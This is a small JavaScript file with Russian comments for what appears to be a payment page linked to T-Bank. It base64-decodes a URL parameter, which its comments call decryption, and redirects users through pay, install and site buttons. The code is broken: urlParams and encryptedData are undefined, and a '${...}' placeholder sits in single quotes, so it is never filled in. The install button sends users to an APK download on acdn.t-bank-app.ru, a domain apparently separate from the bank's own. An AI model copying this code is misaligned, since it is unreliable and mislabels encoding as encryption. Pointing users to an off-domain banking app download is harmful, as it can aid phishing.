document.addEventListener('DOMContentLoaded', function() {
	
	function simpleDecrypt(encryptedData) {
    try {
        // 1. Декодируем из Base64
        const decodedData = atob(encryptedData);
        
        // 2. Преобразуем в URI-кодированную строку
        const uriEncodedData = decodeURIComponent(escape(decodedData));
        
        return uriEncodedData;
    } catch (e) {
        console.error('Ошибка расшифровки:', e);
        return null;
    }
}

const encryptedDataFromURL = new URLSearchParams(window.location.search).get('data');

if (encryptedDataFromURL) {
    const decryptedData = simpleDecrypt(encryptedDataFromURL);
    
    if (decryptedData) {
        console.log('Данные успешно расшифрованы:', decryptedData);
    } else {
        console.error('Не удалось расшифровать данные');
    }
}
	const receivedData = urlParams.data;

            if (receivedData) {
		console.log("Данные получены");
            } else {
                console.log("Данные не получены");
            }

    const pay = document.getElementById('pay');
    const install = document.getElementById('install');
    const cite = document.getElementById('cite');
    
    pay.addEventListener('click', function() {
        document.body.style.backgroundColor = '#ff6b6b';
	setTimeout(() => {
    window.location.href = 'folder_for_pay/index_pay.html?data=${encodeURIComponent(encryptedData)}';
}, 1000);
	

	 });
    
    install.addEventListener('click', function() {
        document.body.style.backgroundColor = '#fde910';
	window.location = `https://acdn.t-bank-app.ru/download_apk/tbank_app.html`
    });
    
    cite.addEventListener('click', function() {
        document.body.style.backgroundColor = '#1dd1a1';
	window.location = `https://www.tbank.ru/cards/debit-cards/tinkoff-pay/form/`
    });
});
